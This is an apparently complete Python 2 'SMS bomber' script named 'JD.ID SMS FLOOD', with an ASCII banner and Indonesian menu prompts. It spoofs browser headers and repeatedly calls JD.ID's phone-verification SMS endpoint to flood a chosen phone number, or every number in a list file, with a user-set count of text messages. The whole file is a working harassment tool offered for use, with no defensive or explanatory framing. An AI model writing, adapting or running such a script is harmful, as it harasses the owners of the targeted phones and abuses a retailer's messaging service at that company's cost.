import requests
from os import system
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
def banner():
    author = "____________"
    qiuby, zhukhi = "Qiuby ","Zhukhi"
    judul = "JD.ID SMS FLOOD"    
    system("clear")
    print """
     _______  ______   _______ 
    (  ____ )(  ___ \ (       ) {}
    | (    )|| (   ) )| () () | {}
    | (____)|| (__/ / | || || | {}
    |  _____)|  __ (  | |(_)| | 
    | (      | (  \ \ | |   | | 
    | )      | )___) )| )   ( |
    |/       |/ \___/ |/     \|
                               
    _________ _______  _______  _______ 
    \__   __/(  ____ \(  ___  )(       )
       ) (   | (    \/| (   ) || () () |
       | |   | (__    | (___) || || || |
       | |   |  __)   |  ___  || |(_)| |
       | |   | (      | (   ) || |   | |
       | |   | (____/\| )   ( || )   ( |
       )_(   (_______/|/     \||/     \|

    """.format("Author: "+G+author+W,
    	          "Python: "+R+qiuby+W+zhukhi,
    	          O+judul+W)
class Bomsms(object):
    def __init__(self, msisdn):
        self.kirim = requests.session()
        self.msisdn = msisdn
   #     if self.msisdn[0] == "+":
  #          self.msisdn = msisdn.replace("+","")
  #      elif self.msisdn[0] == "0":
#            self.msisdn = msisdn[0].replace("0","62") + msisdn[1::]
        self.url = "http://sc.jd.id/phone/sendPhoneSms"
        self.data = {"phone":msisdn,
                     "smsType":"1"}
        self.headers = {"User - Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
                        "Referer":"http://sc.jd.id/phone/bindingPhone.html"}
    
    def start(self):
        print "{}Nomor: {}{} {}{}".format(O, W, G,self.msisdn, W)
        print self.kirim.post(self.url, data = self.data, headers=self.headers).text
        self.kirim.cookies.clear
#Overriding class
class flood(Bomsms):
    def __init__(self, msisdn):
        Bomsms.__init__(self, msisdn)    
    def nangid(self, jml=0):
        for i in range(0,int(jml)):
            self.start()
def phone_list(f):
    pon_buk = []
    with open(f) as phone_book:
        for book in phone_book.readlines():
            pon_buk.append(book.split("\n")[0])
    return pon_buk
def ops():
    while True:
        try:
            jumlah = int(raw_input(R+"Jumlah Flood: "+W))
            print G+"[+] ------- [ MENU ] ------- [+]"+W
            print "[1] Single Target\n[2] Multi Target List"
            print G+"[+] -------------------------[+]"+W
            opsi = int(raw_input(O+"Masukkan Pilihan: "+W))            
            print P+"[?] Nomor HP awalan +62, 62 atau 08 [?]\n"+W
            if opsi == 1:
                no = raw_input(O+"NO HANDPHONE: : "+W)        
                flood(no).nangid(jumlah)
     
            elif opsi == 2:
                files = raw_input("Masukkan file path *.txt: ")
                #files = "/storage/emulated/0/a/video/no.txt"
                print G+"[+] --- [ MENU MULTI TARGET ] --- [+]"+W
                print "[1] SEND KEBANYAK\n[2] FLOOD KEBANYAK"
                print G+"[+] ----------------------------- [+]"+W
                ops2 = raw_input(O+"Pilihan: "+W)
                if ops2 == "1":
                    print P+"[+] SEND KEBANYAK [+]"+W
                    for number in phone_list(files):
                        flood(number).start()
                elif ops2 == "2":
                    print R+"[+] FLOOD KEBANYAK [+]"+W
                    for number in phone_list(files):
                        print "[+] ", number
                        flood(number).nangid(jumlah)
                else:
                    print R+"[!] Nomor Yang di pilih tidak ada [!]"+W
                    continue
            else:
                print R+"[!] Masukkan No dengan Bennar [!]"+W
                continue
        except ValueError:
            print R+"[!] BUKAN NOMOR [!]"+W
            continue
        break
if __name__ == "__main__":
    banner()
    ops()
